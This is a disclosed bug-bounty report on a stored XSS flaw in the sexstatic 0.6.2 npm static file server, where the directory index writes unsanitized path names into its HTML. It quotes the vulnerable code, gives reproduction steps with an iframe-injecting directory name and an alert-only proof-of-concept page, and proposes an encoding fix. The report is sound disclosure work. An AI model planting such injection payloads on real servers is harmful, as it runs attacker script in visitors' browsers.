# [sexstatic] HTML injection in directory name(s) leads to Stored XSS when malicious file is embed with <iframe> element used in directory name

## Report Details
- **Report ID**: 328210
- **URL**: https://hackerone.com/reports/328210
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2018-03-21T13:44:51.253Z
- **Disclosed**: 2018-05-29T10:46:52.680Z

## Reporter
- **Username**: bl4de
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report HTML Injection vulnerability in ```sexstatic``` module. It is possible to use HTML in directory names, which might lead to run arbitrary JavaScript code in the browser.

## Module

**module name:** sexstatic
**version:** 0.6.2
**npm page:** https://www.npmjs.com/package/sexstatic

### Module Description

A simple static file server middleware. Use it with a raw http server, express/connect, or flatiron/union!

Also adds the ability to arbitrarily modify output HTML for whatever reason. And adding additional: simple url -> string handlers simple url -> function handlers

see opts.extras if you wanna get what i'm talking about

I may or may not extend this with further addons in the future to suit my needs.

### Module Stats

Stats
4 downloads in the last day
29 downloads in the last week
158 downloads in the last month

## Vulnerability Description

```sexstatic``` can be used as static file server and presents directory index in the browser. Output is correctly sanitized against any attempts of HTML or JavaScript injection, due to sanitization done in ```sexstatic/lib/sexstatic/showdir.js```:

```javascript
// sexstatic/lib/sexstatic/showdir.js, line 132

    var displayName = he.encode(file[0]) + ((isDir)? '/':'');

    // TODO: use stylessheets?
    html += '<tr>' +
        '<td><code>(' + permsToString(file[1]) + ')</code></td>' +
        '<td style="text-align: right; padding-left: 1em"><code>' + sizeToString(file[1], humanReadable, si) + '</code></td>' +
        '<td style="padding-left: 1em"><a href="' + href + '">' + displayName + '</a></td>' +
        '</tr>\n';
```
However, the same sanitization is missing from this part:

```javascript
// sexstatic/lib/sexstatic/showdir.js, line 106

        var html = [
        '<!doctype html>',
        '<html>',
        '  <head>',
        '    <meta charset="utf-8">',
        '    <title>Index of ' + pathname +'</title>',
        '  </head>',
        '  <body>',
        '<h1>Index of ' + pathname + '</h1>'
        ].join('\n') + '\n';
```

```pathname``` variable is used without sanitization.
This allows malicious user to use valid HTML code as directory name. 
Below I present complete attack scenario with this vulnerability.

## Steps To Reproduce:

- install ```sexstatic``` module:

```
$ npm install sexstatic
```

- in the directory which will be used as root for ```sexstatic```, create directory with following name: ```"><iframe src="malware_frame.html">/```
- in created directory, create file ```malware_frame.html``` with following content:


```html
<!-- malware_frame.html -->
<html>

<head>
    <meta charset="utf8" />
    <title>Frame embeded with malware downloader :P</title>
</head>

<body>
    <p>iframe element with malicious code</p>
    <script>
        alert('Uh oh, I am bad, bad malware!!!')
    </script>
</body>

</html>
```


- run ```sexstatic```:

```
$ ./node_modules/sexstatic/lib/sexstatic.js -p 8080
sexstatic serving /home/rafal.janicki/playground/hackerone/Node at http://0.0.0.0:8080

```

- go to ```http://localhost:8080``` to see directory index:

{F274226}

- now, click on ```"><iframe src="malware_frame.html">/``` directory name on the files list

- malicious JavaScript code from ```malware_frame.html``` file is executed immediately:

{F274225}


## Patch

```pathname``` used in HTML output can be sanitized with the same ```he.encode()``` function, as it is already done for every filename.


## Supporting Material/References:

- Operating system: Ubuntu 16.04
- Node.js 8.9.4
- npm v. 5.6.0
- Chromium	67.0.3367.0 (Developer Build) (64-bit)


## Wrap up

I hope my report will help keeping Node.js Ecosystem users safe :)

- I contacted the maintainer to let him know: [N] 
- I opened an issue in the related repository: [N] 


Regards,

Rafal 'bl4de' Janicki

## Impact

Malicious user is able to inject iframe element with malicious JavaScript code via crafted directory name and trick users to open this directory in the browser.

## Attachments
- sexstatic_xss.png
- sexstatic_xss_1.png
